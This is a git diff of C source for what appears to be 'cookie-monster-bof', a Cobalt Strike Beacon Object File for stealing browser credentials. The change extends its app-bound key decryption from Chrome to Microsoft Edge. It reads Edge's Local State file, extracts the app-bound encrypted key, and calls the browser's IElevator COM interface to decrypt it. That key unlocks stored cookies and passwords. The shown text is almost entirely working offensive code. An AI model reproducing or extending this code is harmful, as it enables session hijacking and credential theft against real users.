@@ -11,17 +11,6 @@
 #include "cookie-monster-bof.h"
 #include "beacon.h"
 
-CHAR *GetFileContent(CHAR *path);
-CHAR *ExtractKey(CHAR *buffer, CHAR *pattern);
-VOID GetMasterKey(CHAR *key);
-VOID GetChromeKey();
-VOID GetFirefoxInfo();
-VOID GetEdgeKey();
-CHAR *GetFirefoxFile(CHAR *file, CHAR* profile);
-VOID GetChromePID();
-VOID GetEdgePID();
-BOOL GetBrowserFile(DWORD PID, CHAR *browserFile, CHAR *filename);
-
 WINBASEAPI DWORD   WINAPI KERNEL32$GetLastError (VOID);
 WINBASEAPI HANDLE  WINAPI KERNEL32$CreateFileA (LPCWSTR lpFileName, DWORD dwDesiredAccess, DWORD dwShareMode, LPSECURITY_ATTRIBUTES lpSecurityAttributes, DWORD dwCreationDisposition, DWORD dwFlagsAndAttributes, HANDLE hTemplateFile);
 WINBASEAPI DWORD   WINAPI KERNEL32$GetFileSize (HANDLE hFile, LPDWORD lpFileSizeHigh);
@@ -253,32 +242,52 @@ char* BytesToHexString(const BYTE *byteArray, size_t size) {
     return hexStr;
 }
 
-VOID GetAppBoundKey(CHAR * key, const CLSID CLSID_Elevator, const IID IID_IElevator) {
+VOID GetAppBoundKey(CHAR * key, CHAR * browser, const CLSID CLSID_Elevator, const IID IID_IElevator) {
     // initialize COM
     HRESULT hr = OLE32$CoInitializeEx(NULL, COINIT_APARTMENTTHREADED);
     if (FAILED(hr)) {
         BeaconPrintf(CALLBACK_ERROR,"CoInitializeEx failed.\n");
         return;
     }
-    IElevator* elevator = NULL;
+    IElevatorChrome* chromeElevator = NULL;
+    IElevatorEdge* edgeElevator = NULL;
     // Create an instance of the IElevator COM object
-    hr = OLE32$CoCreateInstance(&CLSID_Elevator, NULL, CLSCTX_LOCAL_SERVER, &IID_IElevator, (void**)&elevator);
+    if (MSVCRT$strcmp(browser, "chrome") == 0){
+        hr = OLE32$CoCreateInstance(&CLSID_Elevator, NULL, CLSCTX_LOCAL_SERVER, &IID_IElevator, (void**)&chromeElevator);
+    }
+    if (MSVCRT$strcmp(browser, "edge") == 0){
+        hr = OLE32$CoCreateInstance(&CLSID_Elevator, NULL, CLSCTX_LOCAL_SERVER, &IID_IElevator, (void**)&edgeElevator);
+    }
     if (FAILED(hr)) {
         BeaconPrintf(CALLBACK_ERROR,"Failed to create IElevator instance.\n");
         OLE32$CoUninitialize();
         return;
     }
     // Set the security blanket on the proxy
-    hr = OLE32$CoSetProxyBlanket(
-        elevator,
-        RPC_C_AUTHN_DEFAULT,
-        RPC_C_AUTHZ_DEFAULT,
-        COLE_DEFAULT_PRINCIPAL,
-        RPC_C_AUTHN_LEVEL_PKT_PRIVACY,
-        RPC_C_IMP_LEVEL_IMPERSONATE,
-        NULL,
-        EOAC_DYNAMIC_CLOAKING
-    );
+    if (MSVCRT$strcmp(browser, "chrome") == 0) {
+        hr = OLE32$CoSetProxyBlanket(
+            (IUnknown *) chromeElevator,
+            RPC_C_AUTHN_DEFAULT,
+            RPC_C_AUTHZ_DEFAULT,
+            COLE_DEFAULT_PRINCIPAL,
+            RPC_C_AUTHN_LEVEL_PKT_PRIVACY,
+            RPC_C_IMP_LEVEL_IMPERSONATE,
+            NULL,
+            EOAC_DYNAMIC_CLOAKING
+        );
+    }
+    if (MSVCRT$strcmp(browser, "edge") == 0) {
+        hr = OLE32$CoSetProxyBlanket(
+            (IUnknown *) edgeElevator,
+            RPC_C_AUTHN_DEFAULT,
+            RPC_C_AUTHZ_DEFAULT,
+            COLE_DEFAULT_PRINCIPAL,
+            RPC_C_AUTHN_LEVEL_PKT_PRIVACY,
+            RPC_C_IMP_LEVEL_IMPERSONATE,
+            NULL,
+            EOAC_DYNAMIC_CLOAKING
+        );
+    }
 
     if (FAILED(hr)) {
         BeaconPrintf(CALLBACK_ERROR,"Failed to set proxy blanket.\n");
@@ -308,8 +317,12 @@ VOID GetAppBoundKey(CHAR * key, const CLSID CLSID_Elevator, const IID IID_IEleva
     BSTR plaintext_data = NULL;
     DWORD last_error = ERROR_GEN_FAILURE;
     // call com to decrypt key
-    hr = elevator->lpVtbl->DecryptData(elevator,ciphertext_data, &plaintext_data, &last_error);
-    
+    if (MSVCRT$strcmp(browser, "chrome") == 0){
+        hr = chromeElevator->lpVtbl->DecryptData(chromeElevator,ciphertext_data, &plaintext_data, &last_error);
+    }
+    if (MSVCRT$strcmp(browser, "edge") == 0){
+        hr = edgeElevator->lpVtbl->DecryptData(edgeElevator,ciphertext_data, &plaintext_data, &last_error);
+    }
     // return decrypted key
     if (SUCCEEDED(hr)) {
         //BeaconPrintf(CALLBACK_OUTPUT, "Decryption succeeded.\n");
@@ -359,8 +372,9 @@ VOID GetChromeKey() {
         BeaconPrintf(CALLBACK_ERROR,"Reading the file failed.\n");
         return;
     }
-    app_key = ExtractKey(app_data, app_pattern);    
-    GetAppBoundKey(app_key, Chrome_CLSID_Elevator, Chrome_IID_IElevator);
+    app_key = ExtractKey(app_data, app_pattern); 
+    char * browser = "chrome";   
+    GetAppBoundKey(app_key, browser, Chrome_CLSID_Elevator, Chrome_IID_IElevator);
     KERNEL32$GlobalFree(app_data);
 
     return;
@@ -385,6 +399,17 @@ VOID GetEdgeKey() {
     GetMasterKey(key);
 
     // TO DO - App Bound Key
+    CHAR *app_key = NULL;
+    CHAR *app_data = GetFileContent("\\Microsoft\\Edge\\User Data\\Local State");
+    CHAR app_pattern[] =  "\"app_bound_encrypted_key\":\"";
+    if(app_data == NULL) {
+        BeaconPrintf(CALLBACK_ERROR,"Reading the file failed.\n");
+        return;
+    }
+    app_key = ExtractKey(app_data, app_pattern); 
+    char * browser = "edge";   
+    GetAppBoundKey(app_key, browser, Edge_CLSID_Elevator, Edge_IID_IElevator);
+    KERNEL32$GlobalFree(app_data);
 }
 
 CHAR *GetFirefoxFile(CHAR *file, CHAR* profile){
